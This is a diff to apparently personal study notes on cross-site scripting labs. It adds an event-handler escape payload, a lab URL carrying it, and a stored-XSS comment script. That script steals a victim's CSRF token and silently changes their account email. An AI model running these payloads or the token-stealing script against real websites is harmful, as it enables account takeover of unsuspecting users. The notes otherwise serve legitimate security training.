@@ -12,3 +12,36 @@
 // this url will simply trigger/execute javascript from the browser url bar.
 javascript:alert(1)
 
+===
+
+// apparently the website for a comment gets put inside an event on the page.
+<a id="author" href="https://daniel.test/" onclick="var tracker={track(){}};tracker.track('https://daniel.test/');">daniel</a>
+
+// should be able to escape using the HTML entity for single quote:
+&apos;-alert(1)-&apos;
+
+tack onto end of url:
+https://0a74009104caa25783070a4e00b10010.web-security-academy.net/post?postId=9&apos;-alert(1)-&apos;
+
+===
+
+// if you have an account on same website,
+// and website is vuln to xss,
+// may steal csrf token possibly...
+// browsing my account yields change email form posts to following endpoint: /my-account/change-email
+// first, we'll steal the csrf token, then leverage it to change a user's email.
+// we can do this all with one script that we'll post in a comment on the website:
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+  var changeReq = new XMLHttpRequest();
+  changeReq.open('post', '/my-account/change-email', true);
+  changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+
